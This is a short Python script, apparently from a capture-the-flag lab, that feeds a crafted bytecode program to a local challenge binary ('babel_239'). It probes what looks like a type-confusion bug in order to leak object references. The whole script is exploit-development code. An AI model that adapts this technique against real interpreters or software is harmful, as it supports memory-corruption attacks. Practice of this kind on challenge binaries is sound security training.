import vm, struct, subprocess
BIN = "/mnt/work/buuctf/other/2.39/amd64/babel/lab/babel_239"
def frame(p):
    c = vm.asm(p); return struct.pack('<I', len(c)) + c
prog = []
prog += [('str', b''), ('stl', 1)]
prog += [('push', 0), ('push', 0), ('list', 2), ('stl', 0)]
prog += [('ldl', 0), ('print',), ('pop',)]          # HL ref
prog += [('ldl', 1), ('push', 0), ('setb', 0)]      # flip type
prog += [('push', 0), ('list', 1), ('stl', 6)]
prog += [('ldl', 6), ('print',), ('pop',)]          # D ref
prog += [('input', 16), ('stl', 7)]
prog += [('ldl', 7), ('print',), ('pop',)]          # B ref
prog += [('ldl', 0), ('ldl', 6), ('sete', 0)]
prog += [('ldl', 0), ('gete', 0), ('print',), ('pop',)]   # HL[0]
prog += [('ldl', 0), ('ldl', 7), ('sete', 1)]
prog += [('ldl', 0), ('gete', 1), ('print',), ('pop',)]   # HL[1]
p = subprocess.run([BIN], input=frame(prog), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
print(p.returncode, p.stdout, p.stderr[:120])
